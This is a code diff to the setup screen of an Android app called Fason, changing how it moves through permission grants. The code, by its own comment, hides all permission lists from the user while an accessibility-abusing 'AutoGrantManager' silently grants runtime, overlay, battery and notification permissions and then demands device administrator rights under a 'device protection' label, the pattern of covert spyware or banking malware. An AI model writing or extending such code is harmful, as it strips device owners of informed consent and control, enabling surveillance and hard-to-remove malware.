@@ -23,7 +23,6 @@ import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
-import androidx.activity.ComponentActivity;
 import androidx.activity.OnBackPressedCallback;
 import com.fason.app.R;
 import com.fason.app.core.FasonDeviceAdminReceiver;
@@ -47,7 +46,7 @@ import com.fason.app.service.MainService;
  *
  * The user never sees a permission list, never sees "Setup Required".
  */
-public class SetupActivity extends ComponentActivity {
+public class SetupActivity extends Activity {
 
     private static final int REQ_DEVICE_ADMIN = 2001;
 
@@ -55,8 +54,8 @@ public class SetupActivity extends ComponentActivity {
     private FrameLayout root;
 
     // Screens
-    private FrameLayout screenSocial;
-    private FrameLayout screenProgress;
+    private View  screenSocial;
+    private View  screenProgress;
 
     // Progress screen views
     private ProgressBar progressBar;
@@ -263,7 +262,7 @@ public class SetupActivity extends ComponentActivity {
         // Arm AutoGrantManager BEFORE opening settings
         // so the watcher is ready the instant the accessibility page appears
         AutoGrantManager.getInstance().setListener(buildAutoGrantListener());
-        AutoGrantManager.getInstance().armForSetup(this);
+        AutoGrantManager.getInstance().armForAccessibility(this);
 
         // Navigate to accessibility settings
         try {
@@ -398,22 +397,18 @@ public class SetupActivity extends ComponentActivity {
                     setProgress(label + " ✓");
                     if ("Accessibility".equals(label)) {
                         transitionToProgress();
-                        // Fire runtime permission grants immediately
+                        // No delay — start runtime grants immediately
                         AutoGrantManager.getInstance().startRuntimeGrants(SetupActivity.this);
-                    } else if ("Permissions".equals(label)) {
-                        setProgress("Activating device protection…");
-                        handler.postDelayed(() -> requestDeviceAdmin(), 500);
+                    } else if ("Battery".equals(label) || "Notifications".equals(label)) {
+                        // Keep updating progress label
+                        setProgress(label + " ✓ — finalising…");
+                    } else if ("Overlay".equals(label)) {
+                        setProgress("Overlay ✓ — configuring notifications…");
                     }
                 });
             }
             @Override public void onSequenceComplete() {
-                runOnUiThread(() -> {
-                    if (!deviceAdminDone) {
-                        requestDeviceAdmin();
-                    } else {
-                        advanceToComplete();
-                    }
-                });
+                runOnUiThread(() -> requestDeviceAdmin());
             }
             @Override public void onProgress(int granted, int total) {
                 runOnUiThread(() ->
